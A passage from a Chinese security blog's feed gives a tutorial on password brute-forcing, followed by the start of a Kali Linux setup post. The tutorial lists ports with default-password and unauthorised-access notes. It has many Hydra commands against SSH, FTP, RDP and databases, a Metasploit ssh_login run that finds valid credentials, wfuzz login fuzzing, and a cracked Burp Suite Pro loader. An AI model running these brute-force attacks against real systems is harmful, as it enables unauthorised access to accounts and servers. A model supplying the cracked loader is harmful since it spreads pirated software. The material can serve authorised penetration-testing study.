class="line">4,常用端口类(扫描弱口令/端口爆破)</span><br><span class="line"></span><br><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3389 远程桌面</span><br><span class="line"></span><br><span class="line">端口合计详情</span><br><span class="line"></span><br><span class="line">21 ftp </span><br><span class="line"> </span><br><span class="line">22 SSH </span><br><span class="line"> </span><br><span class="line">23 Telnet </span><br><span class="line"> </span><br><span class="line">80 web </span><br><span class="line"> </span><br><span class="line">80-89 web </span><br><span class="line"> </span><br><span class="line">161 SNMP </span><br><span class="line"> </span><br><span class="line">389 LDAP </span><br><span class="line"> </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line"> </span><br><span class="line">445 SMB </span><br><span class="line"> </span><br><span class="line">512,513,514 Rexec </span><br><span class="line"> </span><br><span class="line">873 Rsync未授权 </span><br><span class="line"> </span><br><span class="line">1025,111 NFS </span><br><span class="line"> </span><br><span class="line">1433 MSSQL </span><br><span class="line"> </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line"> </span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line"> </span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line"> </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line"> </span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line"> </span><br><span class="line">3306 MySQL </span><br><span class="line"> </span><br><span class="line">3312/3311 kangle主机管理系统登陆 </span><br><span class="line"> </span><br><span class="line">3389 远程桌面 </span><br><span class="line"> </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line"> </span><br><span class="line">5432 PostgreSQL </span><br><span class="line"> </span><br><span class="line">5900 vnc </span><br><span class="line"> </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line"> </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line"> </span><br><span class="line">6379 redis未授权 </span><br><span class="line"> </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line"> </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line"> </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line"> </span><br><span class="line">8080 tomcat/WDCP主机管理系统，默认弱口令 </span><br><span class="line"> </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line"> </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line"> </span><br><span class="line">8649 ganglia </span><br><span class="line"> </span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口 </span><br><span class="line"> </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line"> </span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </span><br><span class="line"> </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line"> </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line"> </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line"> </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line"> </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Hydra">Hydra</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">-R 继续从上一次进度接着破解。 </span><br><span class="line"> </span><br><span class="line">-S 采用 SSL 链接。 </span><br><span class="line"> </span><br><span class="line">-s PORT 可通过这个参数指定非默认端口。 </span><br><span class="line"> </span><br><span class="line">-l LOGIN 指定破解的用户，对特定用户破解。 </span><br><span class="line"> </span><br><span class="line">-L FILE 指定用户名字典。 </span><br><span class="line"> </span><br><span class="line">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。 </span><br><span class="line"> </span><br><span class="line">-P FILE 大写，指定密码字典。 </span><br><span class="line"> </span><br><span class="line">-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。 </span><br><span class="line"> </span><br><span class="line">-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P 参数。 </span><br><span class="line"> </span><br><span class="line">-M FILE 指定目标列表文件一行一条。 </span><br><span class="line"> </span><br><span class="line">-o FILE 指定结果输出文件。 </span><br><span class="line"> </span><br><span class="line">-f 在使用-M 参数以后，找到第一对登录名或者密码的时候中止破解。 </span><br><span class="line"> </span><br><span class="line">-t TASKS 同时运行的线程数，默认为 16。 -w TIME 设置最大超时的时间，单位秒，默认是 30s。 </span><br><span class="line"> </span><br><span class="line">-v / -V 显示详细过程。 </span><br><span class="line">-o 指定输出文件</span><br><span class="line">service 指定服务名，支持的服务和协议：telnetftp pop3[-ntlm] imap[-ntlm] smb smbnt  http-&#123;<span class="built_in">head</span>|get&#125; http-&#123;get|post&#125;-formhttp-proxy cisco cisco-enable vnc  ldap2 ldap3 mssql mysql oracle-listenerpostgres nntp socks5 rexec  rlogin pcnfs snmp rsh cvs svn icq sapr3 sshsmtp-auth[-ntlm] pcanywhere  teamspeak sip vmauthd firebird ncp afp 等等</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P password.txt ssh://***.***.***.*** -vV -t 15</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[STATUS] attack finished <span class="keyword">for</span> ***.***.***.*** (waiting <span class="keyword">for</span> children to complete tests)</span><br><span class="line">1 of 1 target completed, 0 valid password found</span><br></pre></td></tr></table></figure><p>指定多个ip进行穷举  导入-M IP地址文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P password.txt -M ip.txt ssh -o IPS.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /root/user -P /root/passwd ssh://192.168.1.0 -f -o /root/crack.txt -V </span><br><span class="line">ftp </span><br><span class="line">hydra -L /root/user -P /root/passwd ftp://192.168.1.0 -f -o /root/crack.txt -V </span><br><span class="line">rdp </span><br><span class="line">hydra -L /root/user -P /root/passwd rdp://192.168.1.0 -f -o /root/crack.txt -V </span><br><span class="line">mssql </span><br><span class="line">hydra -L /root/user -P /root/passwd mssql://192.168.0.129 -f -o /root/crack.txt -v </span><br><span class="line">mysql </span><br><span class="line">hydra -L /root/user -P /root/passwd mysql://192.168.0.129 -f -o /root/crack.txt –v -s 3306 </span><br><span class="line">oracle </span><br><span class="line">hydra -P /root/passwd oracle://192.168.0.129 -f -o /root/crack.txt –v </span><br><span class="line">redis </span><br><span class="line">hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 redis </span><br><span class="line">postgresql 弱口令检测 </span><br><span class="line">hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 postgresql </span><br><span class="line">指定多个ip进行穷举 </span><br><span class="line">hydra -L /root/user -P /root/passlist -M /root/ip.txt  -V -o /root/crack mysql -t 16 </span><br><span class="line">hydra -L /root/user -P /root/passlist ssh://192.168.0.112 -vV -f </span><br><span class="line">hydra -L /root/user -P /root/passlist ssh://192.168.0.112 -vV -f -o /root/crack.txt </span><br><span class="line">hydra -L /root/user -P /root/passlist ftp://192.168.0.106 -vV -f -o /root/crack.txt </span><br><span class="line">hydra -l sa -P /root/passlist mssql://192.168.0.103 –vV </span><br></pre></td></tr></table></figure><h2 id="可视化xhydra">可视化xhydra</h2><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210411132818.png" alt="image-20210411132809783"></p><p>没啥好说的,   <img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210411132925.png" alt="image-20210411132919841"></p><h2 id="msf穷举模块">msf穷举模块</h2><p>测试ip:***********</p><p>测试账号:test</p><p>测试密码:123456</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: SSH Login Check Scanner</span><br><span class="line">     Module: auxiliary/scanner/ssh/ssh_login</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  todb &lt;todb@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name              Current Setting  Required  Description</span><br><span class="line">  ----              ---------------  --------  -----------</span><br><span class="line">  BLANK_PASSWORDS   <span class="literal">false</span>            no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">  BRUTEFORCE_SPEED  5                <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">  DB_ALL_CREDS      <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">  DB_ALL_PASS       <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">  DB_ALL_USERS      <span class="literal">false</span>            no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">  PASSWORD                           no        A specific password to authenticate with</span><br><span class="line">  PASS_FILE                          no        File containing passwords, one per line</span><br><span class="line">  RHOSTS                             <span class="built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;f</span></span><br><span class="line"><span class="string">                                               ile:&lt;path&gt;&#x27;</span></span><br><span class="line">  RPORT             22               <span class="built_in">yes</span>       The target port</span><br><span class="line">  STOP_ON_SUCCESS   <span class="literal">false</span>            <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">  THREADS           1                <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">  USERNAME                           no        A specific username to authenticate as</span><br><span class="line">  USERPASS_FILE                      no        File containing <span class="built_in">users</span> and passwords separated by space, one pair per li</span><br><span class="line">                                               ne</span><br><span class="line">  USER_AS_PASS      <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">  USER_FILE                          no        File containing usernames, one per line</span><br><span class="line">  VERBOSE           <span class="literal">false</span>            <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module will <span class="built_in">test</span> ssh logins on a range of machines and report</span><br><span class="line">  successful logins. If you have loaded a database plugin and</span><br><span class="line">  connected to a database this module will record successful logins</span><br><span class="line">  and hosts so you can track your access.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-1999-0502/</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> RHOSTS *********</span><br><span class="line">RHOSTS =&gt; *********</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> USERNAME <span class="built_in">test</span></span><br><span class="line">USERNAME =&gt; <span class="built_in">test</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> PASS_FILE /root/</span><br><span class="line">.ICEauthority    .config          .hushlogin       .python_history  Desktop          Public</span><br><span class="line">.Xauthority      .dbus            .<span class="built_in">local</span>           .viminfo         Documents        Templates</span><br><span class="line">.bash_history    .face            .msf4            .vnc             Downloads        Videos</span><br><span class="line">.bashrc          .face.icon       .pip             .zsh_history     Music            tools</span><br><span class="line">.cache           .gnupg           .profile         .zshrc           Pictures</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> PASS_FILE /root/tools/穷举工具/pass</span><br><span class="line">passlist      password.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> PASS_FILE /root/tools/穷举工具/password.txt</span><br><span class="line">PASS_FILE =&gt; /root/tools/穷举工具/password.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting                Required  Description</span><br><span class="line">   ----              ---------------                --------  -----------</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>                          no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                              <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>                          no        Try each user/password couple stored <span class="keyword">in</span> the current data</span><br><span class="line">                                                              base</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>                          no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>                          no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   PASSWORD                                         no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE         /root/tools/穷举工具/password.txt  no        File containing passwords, one per line</span><br><span class="line">   RHOSTS            **********                 <span class="built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file</span><br><span class="line">                                                               with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT             22                             <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>                          <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                              <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME          <span class="built_in">test</span>                           no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                                    no        File containing <span class="built_in">users</span> and passwords separated by space,</span><br><span class="line">                                                              one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>                          no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                                        no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>                          <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> STOP_ON_SUCCESS teur</span><br><span class="line">[-] The following options failed to validate: Value <span class="string">&#x27;teur&#x27;</span> is not valid <span class="keyword">for</span> option <span class="string">&#x27;STOP_ON_SUCCESS&#x27;</span>.</span><br><span class="line">STOP_ON_SUCCESS =&gt; <span class="literal">false</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> STOP_ON_SUCCESS <span class="literal">true</span></span><br><span class="line">STOP_ON_SUCCESS =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line"></span><br><span class="line">[+] ************:22 - Success: <span class="string">&#x27;test:123456&#x27;</span> <span class="string">&#x27;Could not chdir to home directory /home/test: No such file or directory This account is currently not available. Could not chdir to home directory /home/test: No such file or directory This account is currently not available. &#x27;</span></span><br><span class="line">[-] *************:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with <span class="string">&#x27;set gatherproof false&#x27;</span>.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled <span class="keyword">in</span> the future.</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_login auxiliary/scanner/ssh/ssh_login auxiliary/scanner/telnet/telnet_login auxiliary/scanner/smb/smb_login auxiliary/scanner/mssql/mssql_login auxiliary/scanner/mysql/mysql_login auxiliary/scanner/oracle/oracle_login auxiliary/scanner/postgres/postgres_login auxiliary/scanner/vnc/vnc_login auxiliary/scanner/pcanywhere/pcanywhere_login auxiliary/scanner/snmp/snmp_login </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用法</span><br><span class="line">msfconsole</span><br><span class="line">msf auxiliary(mysql_login) &gt; <span class="built_in">set</span> PASS_FILE /root/passlist.txt</span><br><span class="line">PASS_FILE =&gt; /root/passlist.txt</span><br><span class="line">msf auxiliary(mysql_login) &gt; <span class="built_in">set</span> USERNAME root</span><br><span class="line">USERNAME =&gt; root</span><br><span class="line">msf auxiliary(mysql_login) &gt; run</span><br><span class="line"><span class="built_in">set</span> 设置</span><br><span class="line">show options 查询设置</span><br><span class="line">back 返回</span><br><span class="line">info 查询模块的信息</span><br><span class="line">exploit/run 运行模块</span><br></pre></td></tr></table></figure><h2 id="邮箱破解">邮箱破解</h2><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210411140448.png" alt="image-20210411140441052"></p><h2 id="后台密码穷举">后台密码穷举</h2><p>burp下载<a href="https://www.ddosi.com/">🔰雨苁</a><br>打包了份<a href="/burp.exe">启动器</a><br>无后台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">源代码 就是</span><br><span class="line">java --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:BurpSuiteLoader.jar -noverify -jar burpsuite_pro.jar</span><br></pre></td></tr></table></figure><p>把下载的burp文件重命名如下<br><img src="/image/2021-04-11-23-40-10.webp" alt=""><br>该exe使用方法</p><ul><li>创建快捷方式</li><li>固定到开始屏幕</li></ul><p>burploader-old.jar 为激活工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar burploader-old.jar</span><br></pre></td></tr></table></figure><p>使用方法<a href="https://www.ddosi.com/">🔰雨苁</a>博客有</p><p>wordpress</p><ul><li>cmsmap穷举</li></ul><p>一句话破解</p><ul><li>cheetah</li></ul><p>webshell密码破解</p><p>​      验证码后台破解</p><ul><li>验证码cookie是否能重复利用</li><li>能否重复利用</li><li>绕过</li><li>ocr识别</li></ul><p>wfuzz多线程百万密码测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#example</span></span><br><span class="line">wfuzz -c -z file./passwd.txt -u url -d <span class="string">&quot;username=root&amp;passed=FUZZ&quot;</span></span><br></pre></td></tr></table></figure><h2 id="有-token-防御的网站后台">有 token 防御的网站后台</h2><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/98d503dc3f89b1f57e344abb7f3b7898-f56220.webp" alt="image-20221027172417758"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;常见端口&quot;&gt;常见端口&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="穷举" scheme="https://www.dansemal.cn/categories/%E7%A9%B7%E4%B8%BE/"/>
    
    
    <category term="穷举" scheme="https://www.dansemal.cn/tags/%E7%A9%B7%E4%B8%BE/"/>
    
  </entry>
  
  <entry>
    <title>KALI安装备份</title>
    <link href="https://www.dansemal.cn/posts/3cff777/"/>
    <id>https://www.dansemal.cn/posts/3cff777/</id>
    <published>2021-04-03T07:21:00.000Z</published>
    <updated>2022-09-25T06:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<mark class="hl-label red">此篇不是教程,只是个人备份,注意切换到root环境运行</mark> <h2 id="花屏解决">花屏解决</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfconf-query -c xfwm4 -p /general/vblank_mode -t string -s <span class="string">&quot;xpresent&quot;</span> --create</span><br></pre></td></tr></table></figure><ul><li>个人碰到问题的解决办法</li></ul><h2 id="开启蓝牙">开启蓝牙</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service bluetooth start</span><br><span class="line">update-rc.d bluetooth <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><h2 id="更改默认dir名">更改默认dir名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.config/user-dirs.dirs</span><br><span class="line"></span><br><span class="line">XDG_DESKTOP_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Desktop&quot;</span></span><br><span class="line">XDG_DOWNLOAD_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Downloads&quot;</span></span><br><span class="line">XDG_TEMPLATES_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Templates&quot;</span></span><br><span class="line">XDG_PUBLICSHARE_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Public&quot;</span></span><br><span class="line">XDG_DOCUMENTS_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Documents&quot;</span></span><br><span class="line">XDG_MUSIC_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Music&quot;</span></span><br><span class="line">XDG_PICTURES_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Pictures&quot;</span></span><br><span class="line">XDG_VIDEOS_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Videos&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mv</span> 公共 Public</span><br><span class="line"><span class="built_in">mv</span> 模板 Templates</span><br><span class="line"><span class="built_in">mv</span> 视频 Videos</span><br><span class="line"><span class="built_in">mv</span> 图片 Pictures</span><br><span class="line"><span class="built_in">mv</span> 文档 Documents</span><br><span class="line"><span class="built_in">mv</span> 下载 Downloads</span><br><span class="line"><span class="built_in">mv</span> 音乐 Music</span><br><span class="line"><span class="built_in">mv</span> 桌面 Desktop</span><br></pre></td></tr></table></figure><h2 id="更改默认python为3">更改默认python为3</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/python python /usr/bin/python2 100</span><br><span class="line"></span><br><span class="line">update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">apt install python-is-python3</span><br></pre></td></tr></table></figure><h2 id="更改默认源">更改默认源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.huaweicloud.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb https://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#deb-src https://mirrors.huaweicloud.com/kali kali-rolling main non-free contrib </span></span><br><span class="line"><span class="comment">#deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="comment">#deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="comment">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"><span class="comment">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><h2 id="安装apt-fast加速更新源">安装apt-fast加速更新源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list.d/apt-fast.list</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb [<span class="built_in">arch</span>=amd64 signed-by=/etc/apt/trusted.gpg.d/apt-fast.gpg] http://ppa.launchpad.net/apt-fast/stable/ubuntu bionic main </span><br><span class="line"><span class="comment">#deb-src [arch=amd64 